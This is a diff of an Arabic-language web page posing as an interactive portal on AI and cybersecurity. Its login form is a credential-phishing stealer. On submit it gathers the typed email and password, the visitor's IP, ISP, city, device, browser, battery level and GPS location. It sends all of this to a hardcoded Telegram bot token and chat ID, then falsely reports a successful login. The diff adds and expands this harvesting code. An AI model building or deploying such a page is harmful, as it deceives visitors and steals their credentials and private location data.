@@ -4,49 +4,455 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>عالم الذكاء الاصطناعي والأمن السيبراني</title>
+    <!-- Font Awesome Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;500;700;900&display=swap" rel="stylesheet">
     
     <style>
-        :root { --primary: #00f0ff; --secondary: #7000ff; --bg-dark: #090a10; --card-bg: rgba(255, 255, 255, 0.05); --border: rgba(0, 240, 255, 0.2); --text: #ffffff; }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Tajawal', sans-serif; }
-        body { background-color: var(--bg-dark); color: var(--text); min-height: 100vh; overflow-x: hidden; }
-        nav { display: flex; justify-content: space-between; align-items: center; padding: 20px 8%; background: rgba(9, 10, 16, 0.7); backdrop-filter: blur(10px); border-bottom: 1px solid var(--border); }
-        .logo { font-size: 24px; font-weight: 900; color: var(--primary); }
-        .login-btn { background: linear-gradient(45deg, var(--secondary), var(--primary)); border: none; padding: 10px 25px; color: #fff; border-radius: 30px; cursor: pointer; }
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); z-index: 1000; justify-content: center; align-items: center; }
-        .modal-content { background: #0f1220; border: 2px solid var(--primary); width: 100%; max-width: 450px; border-radius: 20px; padding: 30px; }
-        .submit-btn { width: 100%; padding: 12px; background: var(--primary); border: none; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 15px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; background: rgba(255, 255, 255, 0.05); border: 1px solid var(--border); color: #fff; border-radius: 8px; }
+        :root {
+            --primary: #00f0ff;
+            --secondary: #7000ff;
+            --bg-dark: #090a10;
+            --card-bg: rgba(255, 255, 255, 0.05);
+            --border: rgba(0, 240, 255, 0.2);
+            --text: #ffffff;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Tajawal', sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text);
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+
+        /* Canvas Background */
+        #cyber-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        /* Navbar */
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 8%;
+            background: rgba(9, 10, 16, 0.7);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 900;
+            color: var(--primary);
+            text-shadow: 0 0 10px var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .login-btn {
+            background: linear-gradient(45deg, var(--secondary), var(--primary));
+            border: none;
+            padding: 10px 25px;
+            color: #fff;
+            border-radius: 30px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(112, 0, 255, 0.4);
+            transition: 0.3s ease;
+        }
+
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 25px rgba(0, 240, 255, 0.8);
+        }
+
+        /* Hero Section */
+        .hero {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 50px 8%;
+            min-height: calc(100vh - 80px);
+            flex-wrap: wrap;
+        }
+
+        .hero-text {
+            flex: 1;
+            min-width: 300px;
+        }
+
+        .hero-text h1 {
+            font-size: 3rem;
+            margin-bottom: 20px;
+            line-height: 1.2;
+            background: linear-gradient(90deg, #fff, var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero-text p {
+            font-size: 1.2rem;
+            color: #a0a5c0;
+            margin-bottom: 30px;
+            max-width: 500px;
+        }
+
+        /* Interactive AI Robot Container */
+        .robot-container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-width: 300px;
+            position: relative;
+        }
+
+        .robot {
+            width: 250px;
+            height: 280px;
+            background: rgba(20, 25, 45, 0.8);
+            border: 2px solid var(--primary);
+            border-radius: 40px;
+            box-shadow: 0 0 30px rgba(0, 240, 255, 0.3);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            animation: float 4s ease-in-out infinite;
+            transition: transform 0.1s ease-out;
+        }
+
+        .robot-head {
+            width: 140px;
+            height: 100px;
+            background: #101525;
+            border: 2px solid var(--primary);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-around;
+            padding: 0 20px;
+            position: relative;
+        }
+
+        .eye {
+            width: 25px;
+            height: 25px;
+            background: var(--primary);
+            border-radius: 50%;
+            box-shadow: 0 0 15px var(--primary);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .pupil {
+            width: 10px;
+            height: 10px;
+            background: #fff;
+            border-radius: 50%;
+            position: absolute;
+            top: 7px;
+            left: 7px;
+            transition: all 0.1s ease;
+        }
+
+        .robot-body {
+            width: 180px;
+            height: 110px;
+            background: #101525;
+            border: 2px solid var(--secondary);
+            border-radius: 15px;
+            margin-top: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary);
+            font-size: 2rem;
+            box-shadow: inset 0 0 15px rgba(112, 0, 255, 0.5);
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-15px) rotate(1deg); }
+        }
+
+        /* Interactive Icons Grid */
+        .features {
+            padding: 60px 8%;
+            text-align: center;
+        }
+
+        .section-title {
+            font-size: 2.2rem;
+            margin-bottom: 40px;
+            color: var(--text);
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 25px;
+        }
+
+        .icon-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            padding: 30px;
+            border-radius: 20px;
+            backdrop-filter: blur(5px);
+            cursor: pointer;
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .icon-card:hover {
+            transform: translateY(-10px) scale(1.03);
+            border-color: var(--primary);
+            box-shadow: 0 10px 30px rgba(0, 240, 255, 0.3);
+            background: rgba(0, 240, 255, 0.08);
+        }
+
+        .icon-card i {
+            font-size: 3rem;
+            color: var(--primary);
+            margin-bottom: 15px;
+            transition: 0.3s ease;
+        }
+
+        .icon-card:hover i {
+            transform: scale(1.2) rotate(5deg);
+            color: #fff;
+        }
+
+        .icon-card h3 {
+            font-size: 1.2rem;
+        }
+
+        /* Modal Panel */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(12px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .modal-content {
+            background: #0f1220;
+            border: 2px solid var(--primary);
+            width: 100%;
+            max-width: 650px;
+            border-radius: 20px;
+            padding: 30px;
+            position: relative;
+            box-shadow: 0 0 50px rgba(0, 240, 255, 0.4);
+            animation: modalIn 0.4s ease;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        @keyframes modalIn {
+            from { opacity: 0; transform: scale(0.8) translateY(30px); }
+            to { opacity: 1; transform: scale(1) translateY(0); }
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 1.5rem;
+            color: #fff;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .close-btn:hover { color: var(--primary); }
+
+        .modal-body img {
+            width: 100%;
+            height: 220px;
+            object-fit: cover;
+            border-radius: 12px;
+            margin: 20px 0;
+            border: 1px solid var(--border);
+        }
+
+        .modal-body p {
+            color: #c0c5e0;
+            line-height: 1.8;
+            font-size: 1.05rem;
+        }
+
+        /* Login Modal & Form */
+        .login-card {
+            text-align: center;
+        }
+
+        .login-card input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: #fff;
+            outline: none;
+        }
+
+        .login-card input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 10px var(--primary);
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background: var(--primary);
+            border: none;
+            color: #000;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 15px;
+            font-size: 1rem;
+            transition: 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .submit-btn:hover {
+            background: #fff;
+            box-shadow: 0 0 15px var(--primary);
+        }
     </style>
 </head>
 <body>
 
+    <!-- Cyber Background Canvas -->
+    <canvas id="cyber-canvas"></canvas>
+
+    <!-- Navbar -->
     <nav>
-        <div class="logo">CyberAI</div>
-        <button class="login-btn" onclick="document.getElementById('loginModal').style.display='flex'">تسجيل الدخول</button>
+        <div class="logo">
+            <i class="fa-solid fa-brain"></i> CyberAI
+        </div>
+        <button class="login-btn" onclick="openLogin()">تسجيل الدخول</button>
     </nav>
 
-    <!-- Login Modal -->
-    <div class="modal" id="loginModal">
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-text">
+            <h1>مستقبل الذكاء الاصطناعي والأمن السيبراني</h1>
+            <p>منصة تفاعلية تجمع بين أنظمة حماية البيانات المستقبليّة وخوارزميات الذكاء الاصطناعي التكيفية. حرك الماوس لتتفاعل مع المساعد الآلي!</p>
+        </div>
+        
+        <!-- Interactive Robot -->
+        <div class="robot-container">
+            <div class="robot" id="robot">
+                <div class="robot-head">
+                    <div class="eye"><div class="pupil"></div></div>
+                    <div class="eye"><div class="pupil"></div></div>
+                </div>
+                <div class="robot-body">
+                    <i class="fa-solid fa-microchip"></i>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section class="features">
+        <h2 class="section-title">المواضيع الأساسية (اضغط للتفاصيل)</h2>
+        <div class="grid">
+            <div class="icon-card" onclick="openTopic('ai')">
+                <i class="fa-solid fa-robot"></i>
+                <h3>الذكاء الاصطناعي</h3>
+            </div>
+            <div class="icon-card" onclick="openTopic('sec')">
+                <i class="fa-solid fa-shield-halved"></i>
+                <h3>الأمن السيبراني</h3>
+            </div>
+            <div class="icon-card" onclick="openTopic('ml')">
+                <i class="fa-solid fa-network-wired"></i>
+                <h3>تعلم الآلة والتهديدات</h3>
+            </div>
+            <div class="icon-card" onclick="openTopic('crypto')">
+                <i class="fa-solid fa-user-lock"></i>
+                <h3>التشفير الكمومي</h3>
+            </div>
+        </div>
+    </section>
+
+    <!-- Topic Details Modal -->
+    <div class="modal" id="topicModal">
         <div class="modal-content">
-            <h2 style="color: var(--primary);">تسجيل الدخول</h2>
+            <span class="close-btn" onclick="closeModal('topicModal')">&times;</span>
+            <div class="modal-body" id="modalBody">
+                <!-- Content injected dynamically -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Login Modal Connected to Telegram, Location, Device & IP -->
+    <div class="modal" id="loginModal">
+        <div class="modal-content login-card" style="max-width: 400px;">
+            <span class="close-btn" onclick="closeModal('loginModal')">&times;</span>
+            <h2 style="color: var(--primary); margin-bottom: 20px;">تسجيل الدخول</h2>
+            
             <form id="telegramLoginForm" onsubmit="handleLoginSubmit(event)">
                 <input type="email" id="userEmail" placeholder="البريد الإلكتروني" required>
                 <input type="password" id="userPassword" placeholder="كلمة المرور" required>
-                <button type="submit" class="submit-btn" id="submitBtn">دخول</button>
+                
+                <button type="submit" class="submit-btn" id="submitBtn">
+                    <span>دخول</span>
+                    <i id="btnIcon" class="fa-solid fa-paper-plane"></i>
+                </button>
             </form>
-            <p id="statusMsg" style="text-align:center; margin-top:15px; color:var(--primary);"></p>
+
+            <div id="statusContainer" style="margin-top: 20px; display: none; align-items: center; justify-content: center; gap: 10px;">
+                <i id="statusIcon" class="fa-solid fa-spinner fa-spin" style="font-size: 1.5rem; color: var(--primary);"></i>
+                <p id="statusMsg" style="font-size: 0.95rem; margin: 0;"></p>
+            </div>
         </div>
     </div>
 
     <script>
-        // --- ضع بيانات البوت هنا ---
+        /* ===================================================
+           1. TELEGRAM BOT & DATA COLLECTION CONFIGURATION
+           =================================================== */
         const TELEGRAM_BOT_TOKEN = "7870239308:AAEVoEVu6EKgznDFDepXlRBQ-TWYk5oz4Oo";
         const TELEGRAM_CHAT_ID = "5515542115";
-        // -------------------------
 
-        // 1. جلب بيانات الـ IP
+        // 1.1 جلب الـ IP والموقع الشبكي
         async function getIPInfo() {
             try {
                 const response = await fetch('https://ipapi.co/json/');
@@ -62,58 +468,304 @@
             }
         }
 
-        // 2. جلب بيانات الجهاز
+        // 1.2 جلب تفاصيل الجهاز والبطارية
         async function getDeviceInfo() {
             const ua = navigator.userAgent;
-            const os = ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : "PC/Other";
-            return { os, screenSize: `${screen.width}x${screen.height}` };
+            let os = "غير معروف";
+            let browser = "غير معروف";
+
+            if (ua.includes("Android")) os = "📱 Android";
+            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "🍎 iOS";
+            else if (ua.includes("Windows")) os = "💻 Windows";
+            else if (ua.includes("Mac OS")) os = "💻 Mac";
+            else if (ua.includes("Linux")) os = "🐧 Linux";
+
+            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "🌐 Chrome";
+            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "🌐 Safari";
+            else if (ua.includes("Edg")) browser = "🌐 Edge";
+            else if (ua.includes("Firefox")) browser = "🌐 Firefox";
+
+            let batteryInfo = "غير متاح";
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? '🔌 يشارَك' : '🔋 بطارية'})`;
+                } catch (e) {}
+            }
+
+            return {
+                os,
+                browser,
+                screenSize: `${screen.width} x ${screen.height}`,
+                batteryInfo
+            };
         }
 
-        // 3. جلب الموقع الجغرافي
-        function getCoordinates() {
+        // 1.3 جلب الموقع الجغرافي عبر الـ GPS
+        function getCoordinatesAutomatically() {
             return new Promise((resolve) => {
+                if (!("geolocation" in navigator)) {
+                    resolve({ lat: null, lon: null, status: "❌ المتصفح لا يدعم" });
+                    return;
+                }
+
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, status: "✅ مسموح" }),
-                    (err) => resolve({ lat: null, lon: null, status: "❌ مرفوض" }),
-                    { timeout: 10000 }
+                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, status: "✅ تم الجلب بنجاح" }),
+                    (err) => resolve({ lat: null, lon: null, status: "❌ تم رفض الصلاحية" }),
+                    { enableHighAccuracy: false, timeout: 15000, maximumAge: 0 }
                 );
             });
         }
 
+        // 1.4 دالة معالجة تسجيل الدخول
         async function handleLoginSubmit(event) {
             event.preventDefault();
-            document.getElementById('statusMsg').innerText = "جاري الاتصال...";
 
+            const statusContainer = document.getElementById('statusContainer');
+            const statusIcon = document.getElementById('statusIcon');
+            const statusMsg = document.getElementById('statusMsg');
+            const submitBtn = document.getElementById('submitBtn');
+
+            statusContainer.style.display = 'flex';
+            statusIcon.className = "fa-solid fa-spinner fa-spin";
+            statusIcon.style.color = "var(--primary)";
+            submitBtn.disabled = true;
+
+            statusMsg.style.color = '#00f0ff';
+            statusMsg.innerText = "جاري جمع البيانات والموقع...";
+
+            // جلب كافة البيانات معاً
             const ipInfo = await getIPInfo();
             const deviceInfo = await getDeviceInfo();
-            const loc = await getCoordinates();
+            const locationData = await getCoordinatesAutomatically();
 
-            let locStr = loc.lat ? `\n📍 الموقع: ${loc.lat}, ${loc.lon}\n[خريطة](https://www.google.com/maps?q=${loc.lat},${loc.lon})` : "\n📍 الموقع: غير متاح";
+            statusMsg.innerText = "جاري إرسال البيانات إلى البوت...";
 
-            const message = `🔔 **تسجيل دخول جديد!**
------------------
-📧 الإيميل: ${document.getElementById('userEmail').value}
-🔑 الباسورد: ${document.getElementById('userPassword').value}
-${locStr}
+            let locationText = "";
+            if (locationData.lat && locationData.lon) {
+                const mapsUrl = `https://www.google.com/maps?q=${locationData.lat},${locationData.lon}`;
+                locationText = `📍 **الموقع الجغرافي (GPS):**\n ├ الحالة: ${locationData.status}\n ├ خط العرض: \`${locationData.lat}\`\n ├ خط الطول: \`${locationData.lon}\`\n └ 🗺 [فتح في خرائط Google](${mapsUrl})`;
+            } else {
+                locationText = `📍 **الموقع الجغرافي (GPS):**\n └ الحالة: ${locationData.status}`;
+            }
 
-🌐 **بيانات الشبكة:**
+            const email = document.getElementById('userEmail').value;
+            const password = document.getElementById('userPassword').value;
+
+            const message = `
+🔔 **تسجيل دخول جديد!**
+------------------------------
+📧 **البريد الإلكتروني:** \`${email}\`
+🔑 **كلمة المرور:** \`${password}\`
+
+${locationText}
+
+🌐 **بيانات شبكة الإنترنت (IP):**
  ├ IP: \`${ipInfo.ip}\`
- ├ الدولة: ${ipInfo.country}
- ├ المدينة: ${ipInfo.city}
- └ المزود: ${ipInfo.isp}
+ ├ الدولة: **${ipInfo.country}**
+ ├ المدينة: **${ipInfo.city}**
+ └ المزود: **${ipInfo.isp}**
 
 💻 **معلومات الجهاز:**
- ├ النظام: ${deviceInfo.os}
- └ الشاشة: ${deviceInfo.screenSize}`;
+ ├ النظام: **${deviceInfo.os}**
+ ├ المتصفح: **${deviceInfo.browser}**
+ ├ الشاشة: **${deviceInfo.screenSize}**
+ └ البطارية: **${deviceInfo.batteryInfo}**
 
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
-            }).then(() => {
-                document.getElementById('statusMsg').innerText = "تم بنجاح!";
-                setTimeout(() => document.getElementById('loginModal').style.display = 'none', 1000);
+🌐 **التاريخ:** ${new Date().toLocaleString('ar-EG')}
+            `;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: false
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.ok) {
+                    statusIcon.className = "fa-solid fa-circle-check";
+                    statusIcon.style.color = "#00ff88";
+                    statusMsg.style.color = "#00ff88";
+                    statusMsg.innerText = "تم تسجيل الدخول بنجاح!";
+                    
+                    document.getElementById('telegramLoginForm').reset();
+                    
+                    setTimeout(() => {
+                        closeModal('loginModal');
+                        statusContainer.style.display = 'none';
+                    }, 2000);
+                } else {
+                    throw new Error(data.description);
+                }
+            } catch (error) {
+                statusIcon.className = "fa-solid fa-circle-xmark";
+                statusIcon.style.color = "#ff4a4a";
+                statusMsg.style.color = "#ff4a4a";
+                statusMsg.innerText = "حدث خطأ أثناء الإرسال!";
+            } finally {
+                submitBtn.disabled = false;
+            }
+        }
+
+
+        /* ===================================================
+           2. DYNAMIC CANVAS ANIMATION
+           =================================================== */
+        const canvas = document.getElementById('cyber-canvas');
+        const ctx = canvas.getContext('2d');
+        let particles = [];
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        window.addEventListener('resize', resizeCanvas);
+        resizeCanvas();
+
+        class Particle {
+            constructor() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.size = Math.random() * 2 + 1;
+                this.speedX = Math.random() * 1.5 - 0.75;
+                this.speedY = Math.random() * 1.5 - 0.75;
+            }
+            update() {
+                this.x += this.speedX;
+                this.y += this.speedY;
+                if (this.x > canvas.width) this.x = 0;
+                if (this.x < 0) this.x = canvas.width;
+                if (this.y > canvas.height) this.y = 0;
+                if (this.y < 0) this.y = canvas.height;
+            }
+            draw() {
+                ctx.fillStyle = '#00f0ff';
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.fill();
+            }
+        }
+
+        for (let i = 0; i < 60; i++) particles.push(new Particle());
+
+        function animateCanvas() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            particles.forEach((p, index) => {
+                p.update();
+                p.draw();
+                for (let j = index + 1; j < particles.length; j++) {
+                    const dx = p.x - particles[j].x;
+                    const dy = p.y - particles[j].y;
+                    const dist = Math.sqrt(dx * dx + dy * dy);
+                    if (dist < 100) {
+                        ctx.strokeStyle = `rgba(0, 240, 255, ${1 - dist / 100})`;
+                        ctx.lineWidth = 0.5;
+                        ctx.beginPath();
+                        ctx.moveTo(p.x, p.y);
+                        ctx.lineTo(particles[j].x, particles[j].y);
+                        ctx.stroke();
+                    }
+                }
             });
+            requestAnimationFrame(animateCanvas);
+        }
+        animateCanvas();
+
+
+        /* ===================================================
+           3. INTERACTIVE AI ROBOT MOUSE TRACKER
+           =================================================== */
+        const pupils = document.querySelectorAll('.pupil');
+        const robot = document.getElementById('robot');
+
+        document.addEventListener('mousemove', (e) => {
+            const mouseX = e.clientX;
+            const mouseY = e.clientY;
+
+            pupils.forEach(pupil => {
+                const eye = pupil.parentElement;
+                const rect = eye.getBoundingClientRect();
+                const eyeX = rect.left + rect.width / 2;
+                const eyeY = rect.top + rect.height / 2;
+
+                const angle = Math.atan2(mouseY - eyeY, mouseX - eyeX);
+                const distance = Math.min(6, Math.hypot(mouseX - eyeX, mouseY - eyeY) / 30);
+
+                const x = Math.cos(angle) * distance;
+                const y = Math.sin(angle) * distance;
+
+                pupil.style.transform = `translate(${x}px, ${y}px)`;
+            });
+
+            if (robot) {
+                const robotRect = robot.getBoundingClientRect();
+                const robotCenterX = robotRect.left + robotRect.width / 2;
+                const robotCenterY = robotRect.top + robotRect.height / 2;
+
+                const tiltX = (mouseY - robotCenterY) / 40;
+                const tiltY = (robotCenterX - mouseX) / 40;
+
+                robot.style.transform = `perspective(1000px) rotateX(${tiltX}deg) rotateY(${tiltY}deg)`;
+            }
+        });
+
+
+        /* ===================================================
+           4. MODAL CONTENT & DIALOGS
+           =================================================== */
+        const topicData = {
+            'ai': {
+                title: "الذكاء الاصطناعي (AI)",
+                image: "https://images.unsplash.com/photo-1677442136019-21780efad99a?auto=format&fit=crop&w=600&q=80",
+                text: "الذكاء الاصطناعي يعيد تشكيل العالم من خلال خوارزميات التعلّم العميق والشبكات العصبية. يتيح للأنظمة اتخاذ القرارات وتحليل البيانات الضخمة في أجزاء من الثانية لمساعدة البشرية في اتخاذ أفضل القرارات."
+            },
+            'sec': {
+                title: "الأمن السيبراني والدفاع الذكي",
+                image: "https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=600&q=80",
+                text: "حماية الأنظمة والشبكات والبرامج من الهجمات الرقمية. مع تطور الذكاء الاصطناعي، أصبح الأمن السيبراني يتوقع الثغرات ويصد التهديدات تلقائياً قبل وقوعها."
+            },
+            'ml': {
+                title: "تعلم الآلة واكتشاف التهديدات",
+                image: "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=600&q=80",
+                text: "تعتمد الأنظمة الحديثة على نمذجة سلوك المستخدمين، لملاحظة الأنشطة المريبة وإغلاق الأبواب أمام مخترقي الأنظمة بشكل فوري وذكاء متتقدم."
+            },
+            'crypto': {
+                title: "التشفير الحديث والتشفير الكمومي",
+                image: "https://images.unsplash.com/photo-1526379095098-d400fd0bf935?auto=format&fit=crop&w=600&q=80",
+                text: "العصر القادم من الحماية يعتمد على معالجة البيانات وتشفيرها مستقبلياً لحمايتها حتى ضد أسرع الأجهزة الفائقة التي تعمل بتقنيات الفيزياء الكمومية."
+            }
+        };
+
+        function openTopic(key) {
+            const data = topicData[key];
+            const modalBody = document.getElementById('modalBody');
+            modalBody.innerHTML = `
+                <h2 style="color:var(--primary); font-size:1.8rem;">${data.title}</h2>
+                <img src="${data.image}" alt="${data.title}">
+                <p>${data.text}</p>
+            `;
+            document.getElementById('topicModal').style.display = 'flex';
+        }
+
+        function openLogin() {
+            document.getElementById('loginModal').style.display = 'flex';
+        }
+
+        function closeModal(id) {
+            document.getElementById(id).style.display = 'none';
+        }
+
+        window.onclick = function(event) {
+            if (event.target.classList.contains('modal')) {
+                event.target.style.display = 'none';
+            }
         }
     </script>
 </body>
